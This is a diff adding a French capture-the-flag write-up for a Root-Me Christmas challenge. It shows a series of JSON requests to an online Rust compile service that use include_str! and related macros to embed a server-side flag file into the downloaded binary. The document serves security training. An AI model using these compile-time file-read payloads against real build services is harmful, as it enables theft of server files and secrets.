@@ -12,7 +12,106 @@ seo:
 writeup: |+
   # Write-up Build And Drustroy
   
+  Challenge du jour, abuser un compilateur de code rust en ligne.
+  Via une requête HTTP, on envoie un objet JSON qui représente nos fichiers rust à compiler et on récupère en téléchargement le binaire compilé.
+  Ci-dessous l'exemple de l'énoncé:
   
-  🎁On envoie notre requête et on obtient le flag 🏁
+  ```bash
+  curl -sSk -X POST -H 'Content-Type: application/json' https://day4.challenges.xmas.root-me.org/remote-build -d '{"src/main.rs":"fn main() { println!(\"Hello, world!\"); }"}' --output binary
+  file binary # binary: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, ...
+  ```
+  
+  La première idée d'exploit qui me traverse l'esprit est de compiler un programme qui lirait le flag dans un fichier et l'enverrait à un serveur distant.
+  L'idée est confirmé à la lecture du code, le docker-compose monte un volume qui contient le flag :
+  
+  ```yaml
+  volumes:
+    - ./flag.txt:/flag/randomflaglolilolbigbisous.txt
+  ```
+  
+  On se lance et on découvre rust pour ce challenge. Il y a plusieurs façons d'inclure un fichier texte dans un programme rust.
+  L'objectif pour nous est de l'inclure avec son contenu au moment de la compilation et pas d'inclure son chemin pour ensuite faire sa lecture,
+  car on exécutera le binaire sur notre machine, le fichier n'existera donc pas.
+  
+  Toujours avec l'outil ijhttp pour faire les requêtes, on trouvera les binaires téléchargés dans le repertoire `.idea\httpRequests`
+  si vous utilisez les IDE de JetBrains.
+  
+  ```
+  POST https://day4.challenges.xmas.root-me.org/remote-build
+  Content-Type: application/json
+
+  # binary saved in .idea\httpRequests
+  
+  {"src/main.rs":"fn main() { println!(\"Hello, world!\"); }"}
+
+  ###
+  
+  POST https://day4.challenges.xmas.root-me.org/remote-build
+  Content-Type: application/json
+  
+  {
+    "src/main.rs": "include!(\"/tmp/flag.txt\"); fn main() { println!(\"Hello, world!\"); }"
+  }
+
+  ###
+  
+  POST https://day4.challenges.xmas.root-me.org/remote-build
+  Content-Type: application/json
+  
+  {
+    "src/main.rs": "#[path = \"/tmp/flag.txt\"] mod flag; fn main() { println!(\"Hello, world!\"); }"
+  }
+
+  ###
+  
+  POST https://day4.challenges.xmas.root-me.org/remote-build
+  Content-Type: application/json
+  
+  {
+    "src/main.rs": "pub mod flag; fn main() { println!(\"Hello, world!\"); }"
+  }
+
+  ###
+  
+  
+  POST https://day4.challenges.xmas.root-me.org/remote-build
+  Content-Type: application/json
+  
+  {
+    "src/main.rs": "fn main() { println!(\"Hello, world!\"); }",
+    "/tmp/flag.txt": "flag"
+  }
+
+  ###
+  
+  POST https://day4.challenges.xmas.root-me.org/remote-build
+  Content-Type: application/json
+  
+  {
+    "src/main.rs": "fn main() { let bytes = include_str!(\"/tmp/flag.txt\"); print!(\"{bytes}\"); }"
+  }
+  ```
+
+  Je finirai enfin une bonne syntaxe pour inclure le contenu du fichier dans le binaire compilé.
+  Merci stackoverflow.
+  
+  ```
+  POST https://day4.challenges.xmas.root-me.org/remote-build
+  Content-Type: application/json
+  
+  {
+    "src/main.rs": "fn main() { static LONG_STRING: &'static str = include_str!(\"/tmp/flag.txt\");println!(\"{}\", LONG_STRING); }"
+  }
+  ```
+  
+  🎁On envoie notre requête et on obtient le flag 🏁:
+  
+  ```
+  [79, 102, 102, 101, 110, 83, 107, 105, 108, 108, 83, 97, 121, ... ]
+  ```
+  
+  Le travail n'est pas fini, avec ce bout de code, on exfiltre le flag en valeur numérique ASCII, il faut le convertir en chaîne de caractères.
 
   Crédits du challenge [root-me.org](https://x.com/rootme_org/status/1863296339183796546) et son auteur Laluka
+  
+  [Sommaire >](2024-xmas-root-me.html)
